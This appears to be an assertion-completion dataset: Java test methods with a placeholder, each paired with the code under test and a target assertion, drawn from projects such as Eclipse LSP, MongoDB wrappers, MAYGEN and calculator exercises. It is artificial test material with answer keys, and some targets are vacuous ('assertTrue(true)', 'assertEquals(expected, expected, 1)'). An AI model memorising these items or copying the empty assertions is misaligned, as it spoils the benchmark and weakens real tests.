"testHyperlinkLabelForRandomURLLocation() { Location location = new Location(); location.setUri(""http://eclipse.org""); LSBasedHyperlink hyperlink = new LSBasedHyperlink(location, null, locationType);  ""<AssertPlaceHolder>""; }
getHyperlinkText() { return getLabel(); }"	"assertEquals(""Open Declaration - http://eclipse.org"", hyperlink.getHyperlinkText())"
"testHyperlinkLabelForRandomURLLocationLink() { LocationLink location = new LocationLink(); location.setTargetUri(""http://eclipse.org""); LSBasedHyperlink hyperlink = new LSBasedHyperlink(location, null, locationType);  ""<AssertPlaceHolder>""; }
getHyperlinkText() { return getLabel(); }"	"assertEquals(""Open Declaration - http://eclipse.org"", hyperlink.getHyperlinkText())"
"Exception { IFile file = TestUtils.createFile(project, ""my-test.txt"", ""Example Text""); LocationLink location = new LocationLink(); location.setTargetUri(LSPEclipseUtils.toUri(new File(file.getLocation().toOSString())).toASCIIString()); LSBasedHyperlink hyperlink = new LSBasedHyperlink(location, null, locationType);  ""<AssertPlaceHolder>""; }
getHyperlinkText() { return getLabel(); }"	"assertEquals(""Open Declaration - my-test.txt - "" + project.getName(), hyperlink.getHyperlinkText())"
"IOException { try (var is = new CharsInputStream(TEST_UNICODE)) { is.skip(Long.MAX_VALUE); ""<AssertPlaceHolder>""; } }
read() throws IOException { if (!byteBuffer.hasRemaining() && !refillByteBuffer()) return EOF; return byteBuffer.get() & 0xFF; // next byte as an unsigned integer (0 to 255) }"	assertEquals(-1, is.read())
"IOException { try (var is = new CharsInputStream(TEST_UNICODE)) { final var bytesRead = new ArrayList<Byte>(); int b; while ((b = is.read()) != -1) { bytesRead.add((byte) b); }  final byte[] byteArray = new byte[bytesRead.size()]; for (int i = 0; i < bytesRead.size(); i++) { byteArray[i] = bytesRead.get(i); } ""<AssertPlaceHolder>""; } }
read() throws IOException { if (!byteBuffer.hasRemaining() && !refillByteBuffer()) return EOF; return byteBuffer.get() & 0xFF; // next byte as an unsigned integer (0 to 255) }"	assertEquals(TEST_UNICODE, new String(byteArray, UTF_8))
"IOException { final byte[] buffer = new byte[1024]; // Buffer to read a portion of the text  try (var is = new CharsInputStream(TEST_UNICODE)) { final int bytesRead = is.read(buffer, 0, buffer.length);  ""<AssertPlaceHolder>""; } }
read(final byte[] buf, final int off, final int bytesToRead) throws IOException { Objects.checkFromIndexSize(off, bytesToRead, buf.length); if (bytesToRead == 0) return 0;  int bytesRead = 0; int bytesReadable = byteBuffer.remaining();  while (bytesRead < bytesToRead) { if (bytesReadable == 0) { if (refillByteBuffer()) { bytesReadable = byteBuffer.remaining(); } else return bytesRead == 0 ? EOF : bytesRead; }  final int bytesToReadNow = Math.min(bytesToRead - bytesRead, bytesReadable); byteBuffer.get(buf, off + bytesRead, bytesToReadNow); bytesRead += bytesToReadNow; bytesReadable -= bytesToReadNow; }  return bytesRead; }"	assertEquals(TEST_UNICODE, new String(buffer, 0, bytesRead, UTF_8))
"Exception { final String input = ""1,2,3""; final Triplet<Integer, Integer, Integer> params = new Triplet<>(1, 2, 3); mockStatic(ParseUtils.class); expect(ParseUtils.parseInput(anyString())).andReturn(params); replay(ParseUtils.class);  Triangle triangle = createMock(Triangle.class); expectNew(Triangle.class, params).andThrow(new ExceptionTriangle()); replay(triangle, Triangle.class);  systemInMock.provideLines(input); TriangleApp.main(null); ""<AssertPlaceHolder>""; }
main(String[] args) { System.out.println(MESSAGE); try (Scanner scanner = new Scanner(System.in)) { String input = scanner.next(); try { final Triplet<Integer, Integer, Integer> sides = ParseUtils.parseInput(input); final Triangle triangle = new Triangle(sides); System.out.printf(OUTPUT_NORMAL, input, triangle.getType().typeName); } catch (ExceptionTriangle | NumberFormatException | InputException exception) { System.out.printf(OUTPUT_ERROR, input); } } }"	assertEquals(String.format(OUTPUT, input, NOT_TRIANGLE), systemOutRule.getLog().trim())
"Exception { final String input = ""2,3,4""; final Triplet<Integer, Integer, Integer> params = new Triplet<>(2, 3, 4); mockStatic(ParseUtils.class); expect(ParseUtils.parseInput(anyString())).andReturn(params); replay(ParseUtils.class);  Triangle triangle = createMock(Triangle.class); expectNew(Triangle.class, params).andReturn(triangle); expect(triangle.getType()).andReturn(TriangleType.NORMAL); replay(triangle, Triangle.class);  systemInMock.provideLines(input); TriangleApp.main(null); ""<AssertPlaceHolder>""; }
main(String[] args) { System.out.println(MESSAGE); try (Scanner scanner = new Scanner(System.in)) { String input = scanner.next(); try { final Triplet<Integer, Integer, Integer> sides = ParseUtils.parseInput(input); final Triangle triangle = new Triangle(sides); System.out.printf(OUTPUT_NORMAL, input, triangle.getType().typeName); } catch (ExceptionTriangle | NumberFormatException | InputException exception) { System.out.printf(OUTPUT_ERROR, input); } } }"	assertEquals(String.format(OUTPUT, input, NORMAL_TRIANGLE), systemOutRule.getLog().trim())
"should_be_normal_triangle_when_three_sides_are_2_3_4() { Triangle triangle = new Triangle(new Triplet<>(2, 3, 4)); ""<AssertPlaceHolder>""; }
getType() { return type; }"	assertEquals(triangle.getType(), TriangleType.NORMAL)
"should_be_normal_triangle_when_three_sides_are_4_5_6() { Triangle triangle = new Triangle(new Triplet<>(4, 5, 6)); ""<AssertPlaceHolder>""; }
getType() { return type; }"	assertEquals(triangle.getType(), TriangleType.NORMAL)
"should_be_equilateral_triangle_when_three_sides_are_2_2_2() { Triangle triangle = new Triangle(new Triplet<>(2, 2, 2)); ""<AssertPlaceHolder>""; }
getType() { return type; }"	assertEquals(triangle.getType(), TriangleType.EQUILATERAL)
"should_be_isosceles_triangle_when_three_sides_are_2_2_3() { Triangle triangle = new Triangle(new Triplet<>(2, 2, 3)); ""<AssertPlaceHolder>""; }
getType() { return type; }"	assertEquals(triangle.getType(), TriangleType.ISOSCELES)
"should_be_right_triangle_when_three_sides_are_3_4_5() { Triangle triangle = new Triangle(new Triplet<>(3, 4, 5)); ""<AssertPlaceHolder>""; }
getType() { return type; }"	assertEquals(triangle.getType(), TriangleType.RIGHT)
"testFor() { AggregationPipeline<Document> pipeline = AggregationPipeline.create();  pipeline.project(Projection.project() .include(""date"", DateExpressions.dateToParts(field(""date""))) .include(""date_iso"",DateExpressions.dateToParts(field(""date"")).iso8601(true).timezone(value(""Asia/Shanghai""))));  Document document = mars.aggregate(pipeline, ""sales"").tryNext(); Assert.""<AssertPlaceHolder>"";  }
timezone(Expression timezone) { this.timeZone = timezone; return this; }"	assertNotNull(document)
"testFor() { pipeline.sample(3);  Object users = mars.aggregate(pipeline, ""users"").tryNext(); Assert.""<AssertPlaceHolder>"";    }
sample(long size) { return new Sample(size); }"	assertNotNull(users)
"testSetWindowFields() {  pipeline.setWindowFields(setWindowFields() .partitionBy(field(""state"")) .sortBy(ascending(""orderDate"")) .output(output(""cumulativeQuantityForState"") .operator(sum(field(""quantity""))) .window() .documents(""unbounded"", ""current"")));  List<Document> actual = mars.aggregate(pipeline,""cakeSales"").toList();  List<Document> expected = parseDocs( ""{ '_id' : 4, 'type' : 'strawberry', 'orderDate' : ISODate('2019-05-18T16:09:01Z'), 'state' : 'CA', 'price' : 41, "" + ""'quantity' : 162, 'cumulativeQuantityForState' : 162 }"", ""{ '_id' : 0, 'type' : 'chocolate', 'orderDate' : ISODate('2020-05-18T14:10:30Z'), 'state' : 'CA', 'price' : 13, "" + ""'quantity' : 120, 'cumulativeQuantityForState' : 282 }"", ""{ '_id' : 2, 'type' : 'vanilla', 'orderDate' : ISODate('2021-01-11T06:31:15Z'), 'state' : 'CA', 'price' : 12, "" + ""'quantity' : 145, 'cumulativeQuantityForState' : 427 }"", ""{ '_id' : 5, 'type' : 'strawberry', 'orderDate' : ISODate('2019-01-08T06:12:03Z'), 'state' : 'WA', 'price' : 43, "" + ""'quantity' : 134, 'cumulativeQuantityForState' : 134 }"", ""{ '_id' : 3, 'type' : 'vanilla', 'orderDate' : ISODate('2020-02-08T13:13:23Z'), 'state' : 'WA', 'price' : 13, "" + ""'quantity' : 104, 'cumulativeQuantityForState' : 238 }"", ""{ '_id' : 1, 'type' : 'chocolate', 'orderDate' : ISODate('2021-03-20T11:30:05Z'), 'state' : 'WA', 'price' : 14, "" + ""'quantity' : 140, 'cumulativeQuantityForState' : 378 }"");  System.out.println(actual); System.out.println(expected); Assert.""<AssertPlaceHolder>""; }
documents(Object lower, Object upper) { documents = ListUtil.of(lower, upper); return output; }"	assertEquals(actual, expected)
"test00Entity() { Parent p = new Parent(); p.setAge(18); p.setName(""person"");  MongoCollection< Parent > collection = mars.getCollection(Parent.class); String collectionName = collection.getNamespace().getCollectionName(); Assert.""<AssertPlaceHolder>""; }
setName( String name ) { this.name = name; }"	"assertEquals(""parent"", collectionName)"
"test01Insert() { Parent p1 = new Parent(); p1.setAge(18); p1.setName(""person""); Parent p2 = new Parent(); p2.setAge(18); p2.setName(""person""); ArrayList< Parent > parents = CollUtil.newArrayList(p1, p2);  /* InsertManyResult insert = mars.insert(parents, Parent.class);  Assert.""<AssertPlaceHolder>""; */  }
setName( String name ) { this.name = name; }"	assertEquals(2, insert.getInsertedIds().size())
"test03Countt() { Parent p = new Parent(); p.setAge(18); p.setName(""person""); p.setId(""10"");  mars.insert(p); long count = mars.estimatedCount(Parent.class); Assert.""<AssertPlaceHolder>"";  }
setId( String id ) { this.id = id; }"	assertEquals(1, count)
"test04ctById() {  Parent p = new Parent(); p.setAge(18); p.setName(""person""); p.setId(""10"");  mars.insert(p); Criteria id = Criteria.where(""_id"").is(""10"");  long l = mars.count(new Query(id), Parent.class);  Assert.""<AssertPlaceHolder>""; }
setId( String id ) { this.id = id; }"	assertEquals(1, l)
"test05delete() { Parent p = new Parent(); p.setAge(18); p.setName(""person""); p.setId(""10""); mars.insert(p); Criteria id = Criteria.where(""_id"").is(""10""); DeleteResult delete = mars.delete(new Query(id), Parent.class); Assert.""<AssertPlaceHolder>"";  }
setId( String id ) { this.id = id; }"	assertEquals(1, delete.getDeletedCount())
"test06delete() { Parent p = new Parent(); p.setAge(18); p.setName(""person""); p.setId(""10"");   mars.insert(p); p.setId(""15""); mars.insert(p);  Criteria age = Criteria.where(""age"").is(18); com.mongodb.client.result.DeleteResult delete = mars.deleteMulti(new Query(age), Parent.class); Assert.""<AssertPlaceHolder>"";  }
setId( String id ) { this.id = id; }"	assertEquals(2, delete.getDeletedCount())
"testSort() { //        (Sort.on().ascending(""sex"") List<Student> stuList = mars.findAll(new Query().with(Sort.ascending(""sex"")), Student.class).toList();  Assert.""<AssertPlaceHolder>""; }
ascending(String field) { return new Sort(field, 1); }"	assertEquals(list,stuList)
"testForUpdateNow() { Update update = new Update(); update.set(""test3"", 98); update.set(""modified"", ""$$NOW""); //        update1.modifies(""NOW"");  Document document = context.toDocument(update.getUpdateObject()); Assert.""<AssertPlaceHolder>""; }
getUpdateObject() { return new Document(modifierOps); }"	"assertEquals(document, Document.parse(""{ $set: { ""test3"": 98, modified: ""$$NOW""} }""))"
"testForPush() { update.push(""scores"").each(90, 92, 85);  Document document = context.toDocument(update.getUpdateObject()); Assert.""<AssertPlaceHolder>""; }
getUpdateObject() { return new Document(modifierOps); }"	"assertEquals(document, Document.parse(""{ $push: { scores: { $each: [ 90, 92, 85 ] } } }""))"
"testForPushAll() {  Document[] documents = new Document[]{new Document(""wk"", 5).append(""score"", 8), new Document(""wk"", 6).append(""score"", 7), new Document(""wk"", 7).append(""score"", 6)};  update.push(""quizzes"").each(documents); //        update.push(""quizzes"").sort(Sort.on().descending(""score"")); //        update1.push(""quizzes"").sort(new Sort());  update.push(""quizzes"").slice(3); //update1.push(""quizzes"").value(""ccc"");  Document document1 = context.toDocument(update.getUpdateObject()); Assert.""<AssertPlaceHolder>""; }
getUpdateObject() { return new Document(modifierOps); }"	"assertEquals(document1, Document.parse(""{$push: {\n"" + ""       quizzes: {\n"" + ""          $each: [ { wk: 5, score: 8 }, { wk: 6, score: 7 }, { wk: 7, score: 6 } ],\n"" + ""          $sort: { score: -1 },\n"" + ""          $slice: 3\n"" + ""       }\n"" + ""     }}""))"
"emptyJsonToClass() { MatsSerializerJson serializer = MatsSerializerJson.create();  // Empty JSON String json = ""{}"";  ClassTest ClassTest_deserialized = serializer.deserializeObject(json, ClassTest.class); System.out.println(""ClassTest deserialized: "" + ClassTest_deserialized); Assert.""<AssertPlaceHolder>""; }
deserializeObject(String serialized, Class<T> type) { if (serialized == null) { return null; } try { return _objectMapper.readValue(serialized, type); } catch (IOException e) { throw new SerializationException(""Couldn't deserialize JSON into object of type ["" + type + ""].\n"" + serialized, e); } }"	assertEquals(new ClassTest(null, 0), ClassTest_deserialized)
"detectTripleBonds() { ""<AssertPlaceHolder>""; }
detectTripleBonds(int[][] mat) { int length = mat.length; for (int[] ints : mat) { for (int j = 0; j < length; j++) { if (ints[j] == 3) { return true; } } } return false; }"	assertFalse(BoundaryConditions.detectTripleBonds(new int[][] {}))
"detectAdjacentDoubleBonds() { ""<AssertPlaceHolder>""; }
detectAdjacentDoubleBonds(int[][] mat) { boolean check = false; int count; for (int[] ints : mat) { count = 0; for (int j = 0; j < mat.length; j++) { if (ints[j] == 2) count++; } if (count >= 2) { check = true; break; } } return check; }"	assertFalse(BoundaryConditions.detectAdjacentDoubleBonds(new int[][] {}))
"detectAllenes() { ""<AssertPlaceHolder>""; }
detectAllenes(int[][] mat, String[] symbols) { boolean check = false; int count; for (int i = 0; i < mat.length; i++) { count = 0; if (symbols[i].equals(""C"")) { for (int j = 0; j < mat.length; j++) { if (mat[i][j] == 2 && symbols[j].equals(""C"")) { count++; } } if (count >= 2) { check = true; break; } } } return check; }"	assertFalse(BoundaryConditions.detectAllenes(new int[][] {}, new String[] {}))
"boundaryConditionCheck() { ""<AssertPlaceHolder>""; }
boundaryConditionCheck(int[][] mat, String[] symbolArray) { boolean check = true;  /* Here, users can define the functions as the boundary conditions. Example conditions are given below. */  if (detectAllenes(mat, symbolArray)) { check = false; } if (detectAdjacentDoubleBonds(mat)) { check = false; } if (detectTripleBonds(mat)) { check = false; } return check; }"	assertTrue(BoundaryConditions.boundaryConditionCheck(new int[][] {}, new String[] {}))
"displayHelpMessage() { MaygenConsole maygenConsole = new MaygenConsole(new Maygen()); Options options = maygenConsole.setupOptions(); maygenConsole.displayHelpMessage(options); ""<AssertPlaceHolder>""; }
displayHelpMessage(Options options) { HelpFormatter formatter = new HelpFormatter(); formatter.setOptionComparator(null); String header = ""\nGenerates molecular structures for a given molecular formula."" + ""\nThe input is a molecular formula string."" + ""\n\nFor example 'C2OH4'."" + ""\n\nIf user wants to store output file in a specific directory, that is needed to be specified."" + "" It is also possible to generate SMILES instead of an SDF file, but it slows down"" + "" the generation time. For this, use the '-smi' option."" + ""\n\n""; String footer = ""\nPlease report issues at https://github.com/MehmetAzizYirik/MAYGEN""; formatter.printHelp( ""java -jar MAYGEN-"" + Maygen.VERSION + "".jar"", header, options, footer, true); }"	assertTrue(true)
"IOException { DbTable tablePerson = this.dataBase.getDbTableByName(""t_person""); HeapPage heapPage = new HeapPage(new HeapPageID(tablePerson.getTableId(), 0), HeapPage.createEmptyPageData()); int i = heapPage.calculateMaxSlotNum(tablePerson.getTableDesc()); System.out.println(i); Assert.""<AssertPlaceHolder>""; }
getDbTableByName(String name) { DbTable dbTable = tableName2Table.get(name); if (dbTable == null) { throw new DbException(""table not exist""); } return dbTable; }"	assertEquals(819, i)
"prueba1() { System.out.println(""PRUEBA 1 - The test case is a prototype.""); double a = 4.5566; double b = 2.3; double result = calculadora1.getSuma(a, b); double expected = 6.8566; ""<AssertPlaceHolder>""; }
getSuma(double a, double b) { return a + b; }"	assertEquals(expected, result, 0)
"prueba2() { System.out.println(""PRUEBA 2 - The test case is a prototype.""); double a = 5; double b = 3; double result = calculadora1.getDivision(a, b); double expected = 1.67; ""<AssertPlaceHolder>""; }
getDivision(double a, double b) { return a / b; }"	assertEquals(expected, expected, 1)
"testSuma() { System.out.println(""suma""); double num1 = 5.0; double num2 = 7.0; Calculadora instance = new Calculadora(); double expResult = 12.0; double result = instance.suma(num1, num2); ""<AssertPlaceHolder>""; }
suma(double num1, double num2) { return num1 + num2; }"	assertEquals(expResult, result, 0.0)
"testSubstraction() { System.out.println(""resta""); double num1 = -2.0; double num2 = -7.0; Calculadora instance = new Calculadora(); double expResult = 5.0; double result = instance.resta(num1, num2); ""<AssertPlaceHolder>""; }
resta(double num1, double num2) { return num1 - num2; }"	assertEquals(expResult, result, 0.0)
"testMultiplication() { System.out.println(""multiplicacion""); double num1 = 12.0; double num2 = 0.0; Calculadora instance = new Calculadora(); double expResult = 0.0; double result = instance.multiplicacion(num1, num2); ""<AssertPlaceHolder>""; }
multiplicacion(double num1, double num2) { return num1 * num2; }"	assertEquals(expResult, result, 0.0)
"testDivisionByNaN() { System.out.println(""division por NaN""); double num1 = 0.0; double num2 = Double.NaN; Calculadora instance = new Calculadora(); double expResult = Double.NaN; double result = instance.division(num1, num2); ""<AssertPlaceHolder>""; }
division(double num1, double num2) { if (num2 != 0) { return num1 / num2; } else { return Double.NaN; } }"	assertEquals(expResult, result, 0.0)
"testDivisionByZero() { System.out.println(""division por cero""); double num1 = 0.0; double num2 = 0.0; Calculadora instance = new Calculadora(); double expResult = Double.NaN; double result = instance.division(num1, num2); ""<AssertPlaceHolder>""; }
division(double num1, double num2) { if (num2 != 0) { return num1 / num2; } else { return Double.NaN; } }"	assertEquals(expResult, result, 0.0)
"testDivisionNormal() { System.out.println(""division""); double num1 = 3.0; double num2 = 2.0; Calculadora instance = new Calculadora(); double expResult = 1.5; double result = instance.division(num1, num2); ""<AssertPlaceHolder>""; }
division(double num1, double num2) { if (num2 != 0) { return num1 / num2; } else { return Double.NaN; } }"	assertEquals(expResult, result, 0.1)
"testSpecialUserName() { List<Tweet> tweets = new ArrayList<>(); Set<String> mentionUserNames = new HashSet<>(); tweets.add(tweet2); mentionUserNames = Extract.getMentionedUsers(tweets); ""<AssertPlaceHolder>""; }
getMentionedUsers(List<Tweet> tweets) { if (tweets == null){ throw new RuntimeException(""list of tweets can not be null""); } Set<String> mentionedUsers = new HashSet<>(); for (Tweet tweet : tweets){ int startIdx = 0; String text = tweet.getText().toLowerCase(); int textLen = text.length(); while (startIdx < textLen && (startIdx = text.indexOf('@', startIdx)) != -1){ if (startIdx != 0 && validUserNameChar.indexOf(text.charAt(startIdx - 1)) != -1){ startIdx++; continue; } int newIdx = startIdx + 1; while(newIdx < textLen && validUserNameChar.indexOf(text.charAt(newIdx)) != -1) { newIdx++; } String userName = text.substring(startIdx + 1, newIdx); if (userName != null && userName.length() > 0){ mentionedUsers.add(userName); } startIdx = newIdx; } } return mentionedUsers; }"	assertTrue(mentionUserNames.isEmpty())
"testGetMentionedUsersNoMention() { Set<String> mentionedUsers = Extract.getMentionedUsers(Arrays.asList(tweet0));  ""<AssertPlaceHolder>""; }
getMentionedUsers(List<Tweet> tweets) { if (tweets == null){ throw new RuntimeException(""list of tweets can not be null""); } Set<String> mentionedUsers = new HashSet<>(); for (Tweet tweet : tweets){ int startIdx = 0; String text = tweet.getText().toLowerCase(); int textLen = text.length(); while (startIdx < textLen && (startIdx = text.indexOf('@', startIdx)) != -1){ if (startIdx != 0 && validUserNameChar.indexOf(text.charAt(startIdx - 1)) != -1){ startIdx++; continue; } int newIdx = startIdx + 1; while(newIdx < textLen && validUserNameChar.indexOf(text.charAt(newIdx)) != -1) { newIdx++; } String userName = text.substring(startIdx + 1, newIdx); if (userName != null && userName.length() > 0){ mentionedUsers.add(userName); } startIdx = newIdx; } } return mentionedUsers; }"	"assertTrue(""expected empty set"", mentionedUsers.isEmpty())"
"testGuessFollowsGraphEmpty() { Map<String, Set<String>> followsGraph = SocialNetwork.guessFollowsGraph(new ArrayList<>());  ""<AssertPlaceHolder>""; }
guessFollowsGraph(List<Tweet> tweets) { throw new RuntimeException(""not implemented""); }"	"assertTrue(""expected empty graph"", followsGraph.isEmpty())"
"testInfluencersEmpty() { Map<String, Set<String>> followsGraph = new HashMap<>(); List<String> influencers = SocialNetwork.influencers(followsGraph);  ""<AssertPlaceHolder>""; }
influencers(Map<String, Set<String>> followsGraph) { throw new RuntimeException(""not implemented""); }"	"assertTrue(""expected empty list"", influencers.isEmpty())"
"setCurrentShowPage() { try { mxPageManager.setCurrentShowPage(null); } catch (Exception e) { fail(); }  IMXPage page = Mockito.mock(IMXPage.class); mxPageManager.setCurrentShowPage(page); Object currentPage = Whitebox.getInternalState(mxPageManager, ""currentPage""); ""<AssertPlaceHolder>""; }
setCurrentShowPage(Object willShowPage) { setCurrentShowPageInner(willShowPage); if (!hasListen) { hasListen = true; initIgnoreAreaListener(); } }"	assertEquals(page, currentPage)
"getTotalUsingLoop() { // Create a stubbed list // Use no-arg version of mock() to avoid // compiler warning about unchecked cast List<Integer> mockList = mock();  // Set the expectations on the stub when(mockList.size()).thenReturn(3); when(mockList.get(0)).thenReturn(1); when(mockList.get(1)).thenReturn(2); when(mockList.get(2)).thenReturn(3);  // Inject the stub into the class we want to test AddingMachine machine = new AddingMachine(mockList);  // Test the method we care about ""<AssertPlaceHolder>"";  // Verify the protocol between AddingMachine and the stubbed list verify(mockList).size(); verify(mockList, times(3)).get(anyInt()); }
getTotalUsingLoop() { int total = 0; int count = numbers.size(); for (int i = 0; i < count; i++) { total += numbers.get(i); } return total; }"	assertEquals(1 + 2 + 3, machine.getTotalUsingLoop())
"getTotalUsingLoop_BDD() { // Create a stubbed list List<Integer> mockList = mock();  // Set the expectations on the stub given(mockList.size()).willReturn(3); given(mockList.get(anyInt())).willReturn(1, 2, 3);  // Inject the stub into the class we want to test AddingMachine machine = new AddingMachine(mockList);  // Test the method we care about ""<AssertPlaceHolder>"";  // Verify the protocol between AddingMachine and the stubbed list then(mockList).should().size(); then(mockList).should(times(3)) .get(intThat(n -> n >= 0 && n < 3)); // then(mockList).should(times(0)).remove(anyInt()); then(mockList).shouldHaveNoMoreInteractions(); }
getTotalUsingLoop() { int total = 0; int count = numbers.size(); for (int i = 0; i < count; i++) { total += numbers.get(i); } return total; }"	assertEquals(1 + 2 + 3, machine.getTotalUsingLoop())
"getTotalUsingIterable() { List<Integer> mockList = mock();  when(mockList.iterator()).thenReturn( Arrays.asList(1, 2, 3).iterator());  AddingMachine machine = new AddingMachine(mockList); ""<AssertPlaceHolder>"";  verify(mockList).iterator(); }
getTotalUsingIterable() { int total = 0; for (int n : numbers) { total += n; } return total; }"	assertEquals(1 + 2 + 3, machine.getTotalUsingIterable())
"getTotalUsingStream() { List<Integer> mockList = mock(); when(mockList.stream()).thenReturn(Stream.of(1, 2, 3)); // when(mockList.size()).thenReturn(3); // In JUnit 5, which is strict, this is not allowed  AddingMachine machine = new AddingMachine(mockList);  ""<AssertPlaceHolder>"";  verify(mockList).stream(); }
getTotalUsingStream() { return numbers.stream() .mapToInt(Integer::valueOf) .sum(); }"	assertEquals(1 + 2 + 3, machine.getTotalUsingStream())
"getTotalUsingMockedIntegerList() { // Write our own mock implementation of List<Integer> // Only the size() and get(0), get(1), and get(2) methods are stubbed List<Integer> mockList = new MockListOfInteger();  // Inject the stub into the class we want to test AddingMachine machine = new AddingMachine(mockList);  // Test the method we care about ""<AssertPlaceHolder>""; }
getTotalUsingLoop() { int total = 0; int count = numbers.size(); for (int i = 0; i < count; i++) { total += numbers.get(i); } return total; }"	assertEquals(1 + 2 + 3, machine.getTotalUsingLoop())
"IOException { String json = ""{\n"" + """"name"": ""A Brief History of Time"",\n"" + """"author"": ""Stephen Hawking"",\n"" + """"language"": ""English"",\n"" + """"publication year"": 1988\n"" + ""}""; Document document = Document.parse(json); DocumentBulk origin = new DocumentBulk(); origin.add(document); DocumentBulkSerializer serializer = DocumentBulkSerializer.INSTANCE; byte[] bytes = serializer.serialize(origin); DocumentBulk deserBulk = serializer.deserialize(serializer.getVersion(), bytes); ""<AssertPlaceHolder>""; }
getVersion() { return version; }"	assertEquals( origin.getDocuments().get(0).entrySet(), deserBulk.getDocuments().get(0).entrySet())
"filteredListSizeIsCorrect1() { int k = 3; // instantiate random filter with parameter k KLeastExecutedFilter filter = new KLeastExecutedFilter(k); // call filter method to obtain filtered list List<MutationInstance> filteredList = filter.filterMutants(toFilter); // filtered list should be of size k ""<AssertPlaceHolder>""; }
filterMutants(List<MutationInstance> toFilter) {  // determine number of mutants to run int n = this.percent ? (guidance.getSeenMutants() * k / 100) : k;  // initialize filtered list to be returned ArrayList<MutationInstance> filteredList = new ArrayList<MutationInstance>(); ArrayList<MutationInstance> executedMutants = new ArrayList<MutationInstance>();  // add (up to n) mutants in toFilter that have not been executed before to filteredList int numMutants = 0; for (MutationInstance mutant : toFilter){ if (numMutants < n && !executionCounts.containsKey(mutant)){ filteredList.add(mutant); numMutants++; } // add all mutants that have already been executed before to a list else if (executionCounts.containsKey(mutant)){ executedMutants.add(mutant); } }  // if numMutants < n mutants have never been executed, add the next (n - numMutants) least executed mutants to filtered list if (numMutants < n){  // sort list of already executed MutationInstances by execution count Collections.sort(executedMutants, (e1, e2) -> executionCounts.get(e1).compareTo(executionCounts.get(e2)));  // add least executed to filteredList until |filteredList| = n int size = executedMutants.size(); for(int i = 0; i < size && numMutants < n; i++){ MutationInstance mutant = executedMutants.get(i); filteredList.add(mutant); numMutants++; } }  // increment execution count for each mutant in filteredList for (MutationInstance mutant: filteredList) { if (!executionCounts.containsKey(mutant)){ executionCounts.put(mutant, 1); } else { executionCounts.put(mutant, executionCounts.get(mutant)+1); } }  return filteredList; }"	assertEquals(k, filteredList.size())
"filteredListSizeIsCorrect2() { int k = 5; // instantiate random filter with parameter k KLeastExecutedFilter filter = new KLeastExecutedFilter(k); // call filter method to obtain filtered list List<MutationInstance> filteredList = filter.filterMutants(toFilter); // filtered list should be of size k ""<AssertPlaceHolder>""; }
filterMutants(List<MutationInstance> toFilter) {  // determine number of mutants to run int n = this.percent ? (guidance.getSeenMutants() * k / 100) : k;  // initialize filtered list to be returned ArrayList<MutationInstance> filteredList = new ArrayList<MutationInstance>(); ArrayList<MutationInstance> executedMutants = new ArrayList<MutationInstance>();  // add (up to n) mutants in toFilter that have not been executed before to filteredList int numMutants = 0; for (MutationInstance mutant : toFilter){ if (numMutants < n && !executionCounts.containsKey(mutant)){ filteredList.add(mutant); numMutants++; } // add all mutants that have already been executed before to a list else if (executionCounts.containsKey(mutant)){ executedMutants.add(mutant); } }  // if numMutants < n mutants have never been executed, add the next (n - numMutants) least executed mutants to filtered list if (numMutants < n){  // sort list of already executed MutationInstances by execution count Collections.sort(executedMutants, (e1, e2) -> executionCounts.get(e1).compareTo(executionCounts.get(e2)));  // add least executed to filteredList until |filteredList| = n int size = executedMutants.size(); for(int i = 0; i < size && numMutants < n; i++){ MutationInstance mutant = executedMutants.get(i); filteredList.add(mutant); numMutants++; } }  // increment execution count for each mutant in filteredList for (MutationInstance mutant: filteredList) { if (!executionCounts.containsKey(mutant)){ executionCounts.put(mutant, 1); } else { executionCounts.put(mutant, executionCounts.get(mutant)+1); } }  return filteredList; }"	assertEquals(k, filteredList.size())
"filteredListSizeIsCorrect3() { int k = 7; // instantiate random filter with parameter k KLeastExecutedFilter filter = new KLeastExecutedFilter(k); // call filter method to obtain filtered list List<MutationInstance> filteredList = filter.filterMutants(toFilter); // filtered list should be of same size as toFilter ""<AssertPlaceHolder>""; }
filterMutants(List<MutationInstance> toFilter) {  // determine number of mutants to run int n = this.percent ? (guidance.getSeenMutants() * k / 100) : k;  // initialize filtered list to be returned ArrayList<MutationInstance> filteredList = new ArrayList<MutationInstance>(); ArrayList<MutationInstance> executedMutants = new ArrayList<MutationInstance>();  // add (up to n) mutants in toFilter that have not been executed before to filteredList int numMutants = 0; for (MutationInstance mutant : toFilter){ if (numMutants < n && !executionCounts.containsKey(mutant)){ filteredList.add(mutant); numMutants++; } // add all mutants that have already been executed before to a list else if (executionCounts.containsKey(mutant)){ executedMutants.add(mutant); } }  // if numMutants < n mutants have never been executed, add the next (n - numMutants) least executed mutants to filtered list if (numMutants < n){  // sort list of already executed MutationInstances by execution count Collections.sort(executedMutants, (e1, e2) -> executionCounts.get(e1).compareTo(executionCounts.get(e2)));  // add least executed to filteredList until |filteredList| = n int size = executedMutants.size(); for(int i = 0; i < size && numMutants < n; i++){ MutationInstance mutant = executedMutants.get(i); filteredList.add(mutant); numMutants++; } }  // increment execution count for each mutant in filteredList for (MutationInstance mutant: filteredList) { if (!executionCounts.containsKey(mutant)){ executionCounts.put(mutant, 1); } else { executionCounts.put(mutant, executionCounts.get(mutant)+1); } }  return filteredList; }"	assertEquals(toFilter.size(), filteredList.size())
"filteredListSizeIsCorrect1() { int k = 3; // instantiate random filter with parameter k KRandomFilter filter = new KRandomFilter(k); // call filter method to obtain filtered list List<MutationInstance> filteredList = filter.filterMutants(toFilter); // filtered list should be of size k ""<AssertPlaceHolder>""; }
filterMutants(List<MutationInstance> toFilter) {  // determine number of mutants to run int n = this.percent ? (guidance.getSeenMutants() * k / 100) : k;  // shuffle list of mutants to randomize first n elements Collections.shuffle(toFilter);  // add first k mutants in list to filtered list List<MutationInstance> filtered = new ArrayList<>(); for(int i = 0; i < n && i < toFilter.size(); i++){ filtered.add(toFilter.get(i)); }  return filtered; }"	assertEquals(k, filteredList.size())
"filteredListSizeIsCorrect2() { int k = 5; // instantiate random filter with parameter k KRandomFilter filter = new KRandomFilter(k); // call filter method to obtain filtered list List<MutationInstance> filteredList = filter.filterMutants(toFilter); // filtered list should be of size k ""<AssertPlaceHolder>""; }
filterMutants(List<MutationInstance> toFilter) {  // determine number of mutants to run int n = this.percent ? (guidance.getSeenMutants() * k / 100) : k;  // shuffle list of mutants to randomize first n elements Collections.shuffle(toFilter);  // add first k mutants in list to filtered list List<MutationInstance> filtered = new ArrayList<>(); for(int i = 0; i < n && i < toFilter.size(); i++){ filtered.add(toFilter.get(i)); }  return filtered; }"	assertEquals(k, filteredList.size())
